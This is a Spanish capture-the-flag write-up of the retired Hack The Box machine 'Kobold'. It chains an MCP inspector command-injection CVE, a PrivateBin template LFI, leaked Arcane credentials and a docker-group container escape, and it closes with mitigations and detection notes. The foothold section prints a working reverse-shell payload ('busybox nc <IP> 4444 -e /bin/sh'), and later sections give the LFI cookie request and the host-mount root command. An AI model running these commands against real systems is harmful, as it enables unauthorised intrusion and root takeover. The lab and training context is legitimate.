---
machine: Kobold
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mcp, cve-2026-23744, privategin, docker, container-escape]
---

# Kobold — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Tres servicios modernos: **MCPJam Inspector 1.4.2** (visor de servidores MCP), **PrivateBin 2.0.2** y **Arcane 1.13.0** (gestión de Docker). El inspector tiene **CVE-2026-23744** (corregida en 1.4.3): `/api/mcp/connect` pasa el campo `command` a `child_process.spawn()` sin autenticación, así que un JSON da shell como `ben`. Desde ahí, el grupo `operator` escribe en el directorio de datos que PrivateBin monta en su contenedor, y su LFI de plantillas (**CVE-2025-64714**, 1.7.7–2.0.2, parcheada en 2.0.3) ejecuta el PHP vía cookie `template`; la configuración del panel filtra credenciales que abren Arcane como admin, y un contenedor privilegiado con `/` montado remata el box.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.kobold.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp    ssh
80/tcp    http   nginx (vhosts)
3552/tcp  http   Arcane (gestión Docker)
```

```text
mcp.kobold.htb  -> MCPJam Inspector  (127.0.0.1:6274, sólo HTTPS a través de nginx)
bin.kobold.htb  -> PrivateBin 2.0.2   (127.0.0.1:8080, contenedor)
```

## Enumeración

- El certificado de nginx es wildcard (`*.kobold.htb`): hay que fuzzear vhosts, no sólo el dominio raíz.
- `bin.kobold.htb` proxya a `127.0.0.1:8080`, el contenedor de **PrivateBin 2.0.2**; `mcp.kobold.htb` al **MCPJam Inspector** (6274) y el 3552 expone **Arcane**.
- LinPEAS en la shell de `ben` señala dos cosas: grupos efectivos que no salen en `id`, y el directorio de datos que PrivateBin monta desde el host.

```bash
ffuf -u https://kobold.htb/ -H 'Host: FUZZ.kobold.htb' -w subdomains -fs 154
curl -sk https://mcp.kobold.htb/assets/index-*.js | grep -oE '/api/[a-zA-Z0-9/_-]+' | sort -u
```

La pertenencia a `docker` no aparece en `id` en algunas ejecuciones (sesión heredada por PAM); `newgrp docker` la activa en la shell actual. Otras fuentes ven el grupo directamente en `/etc/group`: la diferencia depende de cómo se abrió la sesión, y sin `newgrp` el `docker run` falla con *permission denied*.

## Foothold

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{
  "name": "pwn",
  "command": "busybox",
  "args": ["sh", "-c", "busybox nc <IP> 4444 -e /bin/sh"]
}
JSON
```

```bash
nc -lvnp 4444
```

```text
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

## Movimiento lateral

- La cadena se queda en el mismo host: `ben` → directorio de datos de PrivateBin → contenedor → credenciales de Arcane. El salto es *entre contenedores*, no a un segundo equipo.

## Escalada de privilegios

```bash
ls -ld /privatebin-data/data
# drwxrwx--- operator  -> escribible por el grupo
```

Ese directorio del host está montado dentro del contenedor de PrivateBin, y el `php -S` del contenedor sirve desde ahí. Se deja un `.php` y se pide como plantilla mediante la **cookie** `template`, que se resuelve de forma relativa a `tpl/`:

```bash
curl -s --cookie "template=../../data/<fichero>" http://bin.kobold.htb/
```

El LFI (CVE-2025-64714) incluye el fichero y ejecuta el código **dentro del contenedor**. Con esa shell se lee la configuración, y de ahí salen las credenciales de Arcane:

```bash
cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
```

Esas credenciales valen para **Arcane** (`:3552`) como administrador.

```bash
newgrp docker        # si el grupo existe pero no está cargado
docker run -v /:/host --rm -it alpine chroot /host bash
```

```text
root@kobold:/# cat /root/root.txt
```

En Arcane el equivalente es entrar como admin (`admin`/`<password>`, la misma contraseña filtrada por la configuración) y crear un proyecto Compose con el volumen del host montado y `privileged: true`; la herramienta corre como root y despliega el contenedor por ti.

Nota de fuentes: varios writeups citan CVEs adicionales de Arcane (un *bypass* de autenticación y un SSRF en `/templates/fetch`) sin número estable entre publicaciones. No se fijan aquí: la ruta verificada es la reutilización de credenciales del panel.

## Evidencia

```text
/home/ben/user.txt  -> <user_flag>
/root/root.txt      -> <root_flag>
```

## Lecciones aprendidas

- Las herramientas de desarrollo de IA (MCP, visores, agentes) asumen "entorno local de confianza"; expuestas a la red son RCE sin autenticación.
- `spawn(comando_del_usuario)` sin allowlist es ejecución por diseño.
- Pertenecer a `docker` (o a un grupo con escritura en un directorio que monta otro servicio) equivale a root.
- Mitigación: autenticación y allowlist en el inspector, nunca exponerlo, grupos mínimos y PrivateBin con plantillas fijas y `open_basedir`.

## Mitigaciones y detección

- El inspector MCP es una herramienta de desarrollo: nunca expuesta a la red, y si se expone, con autenticación y allowlist de binarios ejecutables.
- PrivateBin 2.0.3 o superior, plantillas fijas (`template` no controlable por cookie) y `open_basedir` fuera del directorio de datos.
- Ningún directorio escribible por un grupo de usuarios puede ser el docroot de otro servicio.
- `docker` sólo para administración; Arcane con contraseña propia y sin montar `/` en contenedores de proyecto.
- Detección: POST a `/api/mcp/connect` con `command` controlado, escrituras `.php` en datos de PrivateBin y contenedores nuevos con `-v /:/host`.

## Referencias

- [CVE-2025-64714](https://nvd.nist.gov/vuln/detail/CVE-2025-64714)
- [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
